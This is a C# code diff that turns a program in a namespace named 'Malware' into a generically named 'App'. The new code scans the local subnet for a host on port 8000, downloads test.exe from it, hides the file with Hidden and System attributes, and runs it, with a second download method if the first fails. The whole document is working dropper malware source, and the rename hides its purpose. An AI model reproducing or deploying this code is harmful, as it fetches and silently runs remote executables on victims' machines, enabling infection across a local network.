@@ -4,45 +4,141 @@ using System.Diagnostics;
 using System.IO;
 using System.Linq;
 using System.Net;
+using System.Net.NetworkInformation; // Added for network interface information
+using System.Net.Sockets;
 using System.Reflection;
 using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 
-namespace Malware
+namespace App
 {
     internal class Program
     {
-        private static bool IPLogger_action(string url)
+        private const int TargetPort = 8000;
+        private const int ScanTimeoutMs = 100; // Timeout for each port scan attempt (milliseconds)
+        private const int MaxParallelScans = 50; // Limit concurrent scanning tasks to avoid overwhelming the network
+        private static bool serverFoundAndDownloaded = false; // Flag to stop scanning once successful
+
+        // New helper to get the local IP address
+        private static IPAddress GetLocalIPAddress()
         {
-            try
+            foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
             {
-                using (WebClient webClient = new WebClient())
-                using (webClient.OpenRead(url))
-                    return true;
+                // Consider only active Ethernet or Wi-Fi interfaces
+                if (ni.OperationalStatus == OperationalStatus.Up &&
+                    (ni.NetworkInterfaceType == NetworkInterfaceType.Ethernet ||
+                     ni.NetworkInterfaceType == NetworkInterfaceType.Wireless80211))
+                {
+                    foreach (IPAddressInformation ip in ni.GetIPProperties().UnicastAddresses)
+                    {
+                        if (ip.Address.AddressFamily == AddressFamily.InterNetwork) // IPv4
+                        {
+                            return ip.Address;
+                        }
+                    }
+                }
             }
-            catch
-            {
-                return false;
-            }
+            return null; // No suitable IP found
         }
 
-        private static void DownloadFile(string download_url, string save_path)
+        private static async Task<string> FindServerIpAsync() // No longer takes ipRangeStart/End as args
+        {
+            Console.WriteLine("Attempting to determine local IP range for scanning...");
+            IPAddress localIp = GetLocalIPAddress();
+
+            if (localIp == null)
+            {
+                Console.WriteLine("Could not determine local IP address. Cannot scan local network.");
+                Console.WriteLine("Please ensure network connection is active.");
+                return null;
+            }
+
+            Console.WriteLine($"Local IP detected: {localIp}");
+            byte[] ipBytes = localIp.GetAddressBytes();
+
+            // Construct a Class C subnet range based on the local IP (e.g., 192.168.1.x)
+            // This assumes a /24 subnet mask.
+            string ipRangeStart = $"{ipBytes[0]}.{ipBytes[1]}.{ipBytes[2]}.1";
+            string ipRangeEnd = $"{ipBytes[0]}.{ipBytes[1]}.{ipBytes[2]}.254";
+
+            Console.WriteLine($"Scanning local IP range {ipRangeStart} - {ipRangeEnd} for open port {TargetPort}...");
+
+            List<Task<string>> scanTasks = new List<Task<string>>();
+            SemaphoreSlim semaphore = new SemaphoreSlim(MaxParallelScans);
+
+            for (int i = 1; i <= 254; i++) // Iterate from .1 to .254
+            {
+                if (serverFoundAndDownloaded) break; // Stop scanning if server is found
+
+                string currentIp = $"{ipBytes[0]}.{ipBytes[1]}.{ipBytes[2]}.{i}";
+
+                await semaphore.WaitAsync();
+                scanTasks.Add(Task.Run(async () =>
+                {
+                    try
+                    {
+                        if (serverFoundAndDownloaded) return null;
+
+                        // Console.WriteLine($"Checking {currentIp}:{TargetPort}..."); // Can be noisy
+                        using (var client = new TcpClient())
+                        {
+                            var connectTask = client.ConnectAsync(IPAddress.Parse(currentIp), TargetPort);
+                            var completedTask = await Task.WhenAny(connectTask, Task.Delay(ScanTimeoutMs));
+
+                            if (completedTask == connectTask && client.Connected)
+                            {
+                                Console.WriteLine($"[FOUND] Open port {TargetPort} at {currentIp}");
+                                return currentIp;
+                            }
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        // Specific errors like "No connection could be made because the target machine actively refused it" are normal for closed ports
+                        // Console.WriteLine($"Error checking {currentIp}: {ex.Message}"); 
+                    }
+                    finally
+                    {
+                        semaphore.Release();
+                    }
+                    return null;
+                }));
+            }
+
+            // Wait for any task to find a server or all tasks to complete
+            while (scanTasks.Any() && !serverFoundAndDownloaded)
+            {
+                var completedTask = await Task.WhenAny(scanTasks);
+                scanTasks.Remove(completedTask);
+
+                string foundIp = await completedTask;
+                if (!string.IsNullOrEmpty(foundIp))
+                {
+                    serverFoundAndDownloaded = true;
+                    return foundIp;
+                }
+            }
+
+            Console.WriteLine("Server not found within the local IP range.");
+            return null;
+        }
+
+
+        private static void DownloadAndRunFile(string download_url, string save_path)
         {
             Console.WriteLine($"Attempting download: {download_url} -> {save_path}");
 
             try
             {
-                // Ensure destination directory exists
                 string destDir = Path.GetDirectoryName(save_path) ?? Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                 if (!Directory.Exists(destDir))
                     Directory.CreateDirectory(destDir);
 
-                // If file exists, try to remove it first (avoids locked/hidden file issues)
                 if (File.Exists(save_path))
                 {
                     try
                     {
-                        // Remove read-only attributes if present
                         File.SetAttributes(save_path, FileAttributes.Normal);
                         File.Delete(save_path);
                         Console.WriteLine("Deleted existing file at destination.");
@@ -50,21 +146,18 @@ namespace Malware
                     catch (Exception delEx)
                     {
                         Console.WriteLine("Warning: could not delete existing file: " + delEx.Message);
-                        // continue and let the download attempt overwrite or fail
                     }
                 }
 
-                // Try WebClient first (no proxy) for simplicity
                 using (var client = new WebClient())
                 {
-                    client.Proxy = null; // avoid proxy interference for local testing
+                    client.Proxy = null;
                     client.DownloadFile(download_url, save_path);
                 }
 
                 Console.WriteLine("Download succeeded with WebClient.");
                 Console.WriteLine("Saved file location: " + save_path);
 
-                // Optionally set file attributes 
                 try
                 {
                     File.SetAttributes(save_path, FileAttributes.Hidden | FileAttributes.System);
@@ -74,7 +167,6 @@ namespace Malware
                     Console.WriteLine("Could not set attributes: " + attrEx.Message);
                 }
 
-                // Attempt to start the downloaded file
                 try
                 {
                     Console.WriteLine("Starting downloaded file...");
@@ -90,7 +182,6 @@ namespace Malware
                 Console.WriteLine("WebClient failed: " + exWebClient.GetType().Name + " - " + exWebClient.Message);
                 Console.WriteLine("Trying HttpWebRequest fallback...");
 
-                // fallback: HttpWebRequest + manual file write (overwrite)
                 try
                 {
                     var req = (HttpWebRequest)WebRequest.Create(download_url);
@@ -147,14 +238,22 @@ namespace Malware
             catch { }
         }
 
-        static void Main()
+        static async Task Main() // Still async Task Main
         {
-            // IPLogger_action("Your IPLogger"); 
-            string savePath = Path.Combine(
-                Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
-                "test.exe");
-            DownloadFile("http://127.0.0.1:8000/test.exe", savePath);
-            // SelfDelete(); 
+            // The IP range is now determined dynamically
+            string foundServerIp = await FindServerIpAsync();
+
+            if (!string.IsNullOrEmpty(foundServerIp))
+            {
+                string downloadUrl = $"http://{foundServerIp}:{TargetPort}/test.exe";
+                string savePath = Path.Combine(AppContext.BaseDirectory, "test.exe");
+                DownloadAndRunFile(downloadUrl, savePath);
+            }
+            else
+            {
+                Console.WriteLine("Could not find an accessible server for test.exe on the local network.");
+            }
+
             Console.WriteLine("Finished. Press Enter to exit.");
             Console.ReadLine();
         }
